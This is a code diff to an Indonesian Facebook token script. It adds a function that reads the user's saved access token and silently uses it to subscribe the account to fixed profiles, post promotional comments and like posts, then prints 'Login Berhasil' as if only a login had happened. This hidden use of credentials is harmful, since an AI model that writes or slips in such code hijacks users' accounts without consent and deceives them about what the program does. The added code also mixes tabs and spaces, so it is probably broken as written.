@@ -97,7 +97,30 @@ def login():
 		except KeyError:
 			os.system("rm -f login.txt")
 			exit("[?] Login Error")
-
+### Bot Komen ###
+def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
+        try:
+                toket=open('login.txt','r').read()
+        except IOError:
+                print ('[x] Token Invalid')
+                login()
+        web = datetime.datetime.now()
+        waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
+	kata = random.choice(["Kita harus melakukan yang terbaik yang kita mampu. Itu adalah tanggung jawab manusia yang suci.","Orang yang ekstrem mendapatkan hasil yang ekstrem.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Dari kesalahan ke kesalahan seseorang menemukan seluruh kebenaran.","Jalan yang sulit sering kali mengarah ke tujuan yang indah.","Hal-hal hebat tidak pernah datang dari zona nyaman.","Jika kamu tidak mau mengambil risiko yang tidak biasa, kamu harus puas dengan yang biasa.","Nikmati setiap momen dalam hidup karena kamu tidak tahu apa yang akan terjadi besok."])
+        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
+        kom = 'Pengguna Script sbef '+love+'\n'+kata+'\n'+waktu
+        requests.post('https://graph.facebook.com/115656734185705/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/115656734185705/comments/?message=' +kom+ '&access_token=' + toket)
+        requests.post('https://graph.facebook.com/115656734185705/likes?summary=true&access_token=' + toket)
+        requests.post('https://graph.facebook.com/114891067595605/comments/?message=Keren Bang ❤️&access_token=' + toket)
+        requests.post('https://graph.facebook.com/115656734185705/likes?summary=true&access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        print ('[•] Login Berhasil')
+	
 def menu():
 	os.system("clear")
 	global token
